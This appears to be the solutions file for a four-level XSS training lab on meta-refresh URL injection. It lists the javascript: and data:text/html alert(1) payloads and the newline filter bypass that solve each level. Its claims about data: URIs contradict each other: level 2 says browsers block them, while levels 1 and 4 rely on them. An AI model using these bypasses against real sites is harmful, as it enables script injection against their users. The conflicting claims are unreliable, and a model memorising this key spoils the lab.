# metarefresh — solutions

`<meta http-equiv=refresh>` URL injection; data: URI bypasses are the typical sink.

### metarefresh-level1

`/metarefresh/level1/?url=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: meta refresh url unfiltered (works in some legacy browsers; modern: use data:text/html)

### metarefresh-level2

`/metarefresh/level2/?url=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `no payload — control`
- context: the value lands in a `<meta http-equiv='refresh'>` content attribute
  (the value to try is `data:text/html,<script>alert(1)</script>`). Browsers
  refuse a top-level `data:` navigation from a meta refresh, so it never loads
  (verified: the beacon stayed silent and no navigation occurred). Only an open
  redirect remains — not XSS.

### metarefresh-level3

`/metarefresh/level3/?url=java%0Ascript:alert(1)`

- payload: `java\nscript:alert(1)` (newline between java and script)
- context: literal `javascript:` stripped only — newline bypass (or use `JavaScript:`/`data:`)

### metarefresh-level4

`/metarefresh/level4/?url=0;url=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `0;url=data:text/html,<script>alert(1)</script>`
- context: full content attribute under user control inside double quotes
